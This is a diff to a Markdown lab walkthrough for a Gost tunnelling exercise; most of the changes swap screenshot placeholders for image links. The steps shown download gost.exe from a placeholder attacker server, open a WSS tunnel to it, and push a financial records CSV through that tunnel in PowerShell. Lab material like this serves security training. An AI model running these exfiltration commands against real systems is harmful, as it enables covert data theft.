@@ -52,21 +52,24 @@ cat C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
 ```
 <img width="1151" height="112" alt="image" src="https://github.com/user-attachments/assets/a4b9ed61-c81a-471f-b0cd-3089db552467" />
 
-- Download the Gost payload directly from our Ubuntu server into a temporary folder. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.
+- Download the Gost payload directly from our Ubuntu server into a temporary folder. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**
 
 ```powershell
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\gost.exe"
 ```
 
-[Screenshot: Rularea Invoke-WebRequest fără erori, întorcându-se la prompt]
+<img width="1205" height="255" alt="image" src="https://github.com/user-attachments/assets/0a7d8e79-123f-4fe0-a787-398b3a56a43b" />
+
+- You should also be able to see the **server GET request** in your python server terminal: 
+
+<img width="891" height="231" alt="image" src="https://github.com/user-attachments/assets/955efed3-0336-4e3e-8d51-b3d7f7be42c7" />
 
 - Start the Gost tunnel entry point. This opens a local port (9000) and encapsulates everything we send to it into an encrypted WebSocket (WSS) stream directed at our Ubuntu server.
 
 ```powershell
 & "$env:TEMP\gost.exe" -L tcp://:9000 -F wss://<UBUNTU_IP>:443
 ```
-
-[Screenshot: Gost rulând pe Windows, deschizând portul 9000]
+<img width="1199" height="96" alt="image" src="https://github.com/user-attachments/assets/244e1e26-f48c-49db-8ff8-1488fa032e30" />
 
 - Open a *NEW* PowerShell terminal. We will now push the sensitive financial records straight into the local end of the tunnel. 
 
@@ -80,8 +83,8 @@ $stream.Close()
 $client.Close()
 Write-Host "Exfil Complete!" -ForegroundColor Green
 ```
+<img width="785" height="358" alt="image" src="https://github.com/user-attachments/assets/b6160515-b0fb-496c-bf5b-fdf5e175670e" />
 
-[Screenshot: Scriptul PS de trimitere rulat, afișând mesajul verde "Exfil Complete!"]
 
 ---
 
